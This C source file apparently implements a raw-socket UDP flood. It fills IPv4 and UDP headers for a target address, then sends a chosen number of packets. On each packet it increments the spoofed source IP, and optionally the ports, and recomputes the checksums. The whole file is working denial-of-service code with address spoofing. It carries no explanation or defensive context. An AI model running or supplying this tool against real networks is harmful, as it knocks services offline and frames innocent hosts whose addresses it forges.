FUNC uint32_t checksum_pre(void *ptr, uint32_t size){
  uint32_t sum = 0;

  while(size > 1) {
    sum += *(uint16_t *)ptr;
    *(uintptr_t *)&ptr += 2;
    size -= 2;
  }

  if(size == 1) {
    sum += *(uint8_t *)ptr;
  }

  return sum;
}

FUNC uint32_t checksum_pre_single16(uint32_t p){
  return ((uint16_t *)&p)[0];
}
FUNC uint32_t checksum_pre_single32(uint32_t p){
  return ((uint16_t *)&p)[0] + ((uint16_t *)&p)[1];
}

FUNC uint16_t checksum_final(uint32_t pre){
  pre = (pre >> 16) + (pre & 0xffff);
  pre = pre + (pre >> 16);

  return ~(uint16_t)pre;
}

FUNC void run(pile_t *pile){
  NET_socket_t s;
  sint32_t err = NET_socket2(NET_AF_INET, NET_SOCK_RAW, NET_IPPROTO_RAW, &s);
  if(err){
    puts_literal("NET_socket2 fail. need root probably\n");
    _exit(1);
  }

  NET_addr4port_t dst;
  dst.ip = pile->target_ipv4;
  dst.port = 0;

  if(NET_connect(&s, &dst)){
    _abort();
  }

  uint8_t data[0x800];

  NET_ipv4hdr_t *ipv4hdr = (NET_ipv4hdr_t *)data;
  NET_udphdr_t *udphdr = (NET_udphdr_t *)&ipv4hdr[1];
  uint8_t *payload = (uint8_t *)&udphdr[1];

  if((uintptr_t)payload - (uintptr_t)ipv4hdr + pile->payload_size > sizeof(data)){
    _abort();
  }

  for(uint32_t i = 0; i < pile->payload_size; i++){
    payload[i] = 0;
  }

  ipv4hdr->ihl = 5;
  ipv4hdr->version = 4;
  ipv4hdr->tos = 0;
  ipv4hdr->tot_len = sizeof(NET_ipv4hdr_t) + sizeof(NET_udphdr_t) + pile->payload_size;
  ipv4hdr->id = NET_hton32(54321);
  ipv4hdr->frag_off = 0;
  ipv4hdr->ttl = 255;
  ipv4hdr->protocol = NET_IPPROTO_UDP;
  ipv4hdr->check = 0;
  ipv4hdr->saddr = 0;
  ipv4hdr->daddr = NET_hton32(dst.ip);

  uint32_t ipv4check_pre = checksum_pre(ipv4hdr, sizeof(*ipv4hdr));

  if(pile->rand_sport){
    udphdr->source = NET_hton16(0);
  }
  else{
    udphdr->source = NET_hton16(pile->sport);
  }
  if(pile->rand_dport){
    udphdr->dest = NET_hton16(0);
  }
  else{
    udphdr->dest = NET_hton16(pile->dport);
  }
  udphdr->len = NET_hton16(sizeof(*udphdr) + pile->payload_size);
  udphdr->check = 0;

  uint32_t udpcheck_pre = 0;
  udpcheck_pre += checksum_pre(&ipv4hdr->daddr, sizeof(ipv4hdr->daddr));
  udpcheck_pre += NET_hton16(NET_IPPROTO_UDP);
  udpcheck_pre += udphdr->len;
  udpcheck_pre += checksum_pre(udphdr, sizeof(*udphdr) + pile->payload_size);

  for(uint64_t ithreshold = pile->threshold; ithreshold--;){
    ipv4hdr->saddr++;

    ipv4hdr->check = checksum_final(
      ipv4check_pre +
      checksum_pre_single32(ipv4hdr->saddr)
    );

    uint32_t udpcheck_pre_current = udpcheck_pre;

    if(pile->rand_sport){
      udphdr->source++;
      udpcheck_pre_current += checksum_pre_single16(udphdr->source);
    }
    if(pile->rand_dport){
      udphdr->dest++;
      udpcheck_pre_current += checksum_pre_single16(udphdr->dest);
    }

    udpcheck_pre_current += checksum_pre_single32(ipv4hdr->saddr);

    udphdr->check = checksum_final(udpcheck_pre_current);

    IO_ssize_t rsize = IO_write(&s.fd, data, ipv4hdr->tot_len);
    if((IO_size_t)rsize > (IO_size_t)-4096){
      _abort();
    }
  }
}
